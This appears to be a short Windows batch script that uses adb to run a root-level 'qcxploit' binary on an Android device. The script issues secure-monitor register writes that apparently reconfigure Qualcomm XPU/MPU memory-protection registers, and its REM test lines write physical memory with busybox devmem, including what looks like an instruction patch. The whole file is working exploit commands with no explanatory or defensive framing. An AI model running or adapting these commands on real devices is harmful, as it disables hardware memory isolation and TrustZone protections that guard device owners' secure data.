echo #HWIO_BIMC_S_DDR0_XPU_SCR_ADDR
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 44a000 13f 0" 
echo #HWIO_BIMC_S_DDR0_XPU_CR_ADDR
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 44a080 19f 0"
echo #HWIO_OCIMEM_MPU_XPU_SCR_ADDR
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 53000 13f 0" 
echo HWIO_OCIMEM_MPU_XPU_CR_ADDR A:0x53080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 53080 11f 0" 


REM Test: 
REM ./busybox devmem 0x865ef918
REM ./busybox devmem 0x865ef918 32 0x865630fc
REM ./busybox devmem 0x865ef918 32 0x86572214
REM ./busybox devmem 0x8657221C 32 0xD2800000
REM ./qcxploit svcreg 200030F 4 0 53000 13e 0
